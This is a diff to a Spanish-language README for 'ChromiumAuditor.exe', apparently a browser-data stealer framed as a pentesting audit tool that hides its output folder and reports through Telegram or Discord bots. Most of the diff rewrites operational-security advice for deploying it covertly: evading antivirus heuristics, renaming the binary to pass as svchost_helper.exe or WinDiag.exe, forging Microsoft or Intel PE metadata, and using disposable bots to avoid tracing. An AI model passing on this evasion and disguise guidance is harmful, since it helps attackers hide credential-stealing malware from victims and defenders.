@@ -170,9 +170,11 @@ Antes de desplegar el ejecutable, valida que todo funciona y que el sigilo es ef
 ### 1. Test funcional básico
 
 ```bash
-# Ejecutar sin ventana y verificar que genera el reporte en .audit/
-ChromiumAuditor.exe --no-wipe
-# El reporte debería aparecer en .audit/audit_report.html
+# Ejecutar y esperar (si falla la ruta local, buscar en %APPDATA%\.audit\)
+# Nota: La carpeta .audit tiene el atributo "Hidden" (Oculta) por sistema.
+ChromiumAuditor.exe --no-wipe -v
+
+# El reporte aparecerá como .audit/audit_report.html (o con timestamp si ya existía)
 ```
 
 ### 2. Análisis estático manual
@@ -225,21 +227,14 @@ start /b ChromiumAuditor.exe
 
 ---
 
-## ⚖️ Recomendación de Pentesting
-
-* **Evadir Heurística**: Si el binario es detectado como malicioso, prueba a compilar **sin** la opción `--noconsole` para que parezca un script administrativo estándar de Windows.
-* **Bots de un solo uso**: Nunca uses tus tokens principales de Telegram. Crea un bot exclusivo para cada auditoría y elimínalo al finalizar para prevenir la trazabilidad.
-
----
-
-## ⚖️ Recomendaciones de OPSEC
+## ⚖️ Recomendaciones de OPSEC (Seguridad Operacional)
 
 * **Backup obligatorio**: Guarda siempre `main.py.bak` antes de ofuscar. El proceso es destructivo.
-* **Evadir Heurística**: Si el binario es detectado, compilar **sin** `--noconsole` hace que parezca una herramienta de administración estándar de Windows.
-* **Bots de un solo uso**: Nunca uses tus tokens principales de Telegram/Discord. Crea credenciales exclusivas por auditoría y elimínalas al finalizar.
-* **Renombrar el `.exe`**: Nombres como `ChromiumAuditor.exe` son obvios. Usa nombres creíbles: `svchost_helper.exe`, `SysHealth.exe`, `WinDiag.exe`.
-* **Metadatos del PE**: PyInstaller permite inyectar metadatos con un archivo `.spec`. Añadir `FileDescription`, `ProductName` y `CompanyName` verosímiles reduce sospechas en análisis PE.
-* **Timestamp realista**: El `autocert.sh` ya usa DigiCert TSA, lo que fija la fecha de firma en el momento de la operación.
+* **Evadir Heurística**: Si el binario es detectado, compilar **sin** la opción `--noconsole` hace que el proceso parezca una herramienta de administración interna estándar de Windows.
+* **Bots de un solo uso**: Nunca uses tus cuentas principales. Crea un bot de Telegram o Webhook de Discord exclusivo para cada auditoría y elimínalo al finalizar para prevenir trazabilidad.
+* **Renombrar el `.exe`**: Nombres como "ChromiumAuditor" son sospechosos. Prefiere `SysHealth.exe`, `WinDiag.exe` o `svchost_helper.exe`.
+* **Metadatos del PE**: PyInstaller permite inyectar metadatos (Versión, Compañía, Descripción) mediante `.spec`. Un binario con metadatos de "Microsoft Corporation" o "Intel" despierta menos sospechas.
+* **Timestamp y Firma**: El `autocert.sh` usa DigiCert TSA para que el timestamp de la firma sea verosímil y no coincida con el tiempo de sistema si este fue alterado.
 
 ---
 <div align="center">
